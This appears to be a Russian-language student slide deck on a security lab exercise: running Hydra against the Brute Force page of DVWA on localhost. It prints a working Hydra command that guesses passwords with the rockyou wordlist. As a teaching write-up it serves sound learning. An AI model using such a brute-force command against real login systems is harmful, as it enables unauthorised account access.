---
## Front matter
title: "Презентация по индивидуальному проекту №3"
subtitle: "НКНбд-01-21"
author: "Юсупов Эмиль Артурович"

## Generic otions
lang: ru-RU

## Formatting
toc: false
slide_level: 2
theme: metropolis
header-includes: 
 - \metroset{progressbar=frametitle,sectionpage=progressbar,numbering=fraction}
 - '\makeatletter'
 - '\beamer@ignorenonframefalse'
 - '\makeatother'
aspectratio: 43
section-titles: true
---

# Введение

## Цель работы

- Воспользоваться утилитой Hydra на DVWA в секции Brute Force.


# Выполнение работы

1. Зашли во вкладку localhost/DVWA/vulnerabilities/brute/

2. Нашли нужные для нас компоненты страницы вида input, где name принадлежит [username, password, login] и параграф ошибки.

3. Ввели команду для hydra

```bash
hydra localhost http-post-form -l login \
-P /usr/share/wordlists/rockyou.txt \
"/DVWA/vulnerabilities/brute/ \
:username=^USER^&password=^PASS^&Login=login:Login failed" -V
```

4. Узнали, какие пароли успешны при данном username

# Выводы

Во время выполнения работы, мы получили практические навыки Brute Force при использовании утилиты Hydra

# Спасибо за вниманиие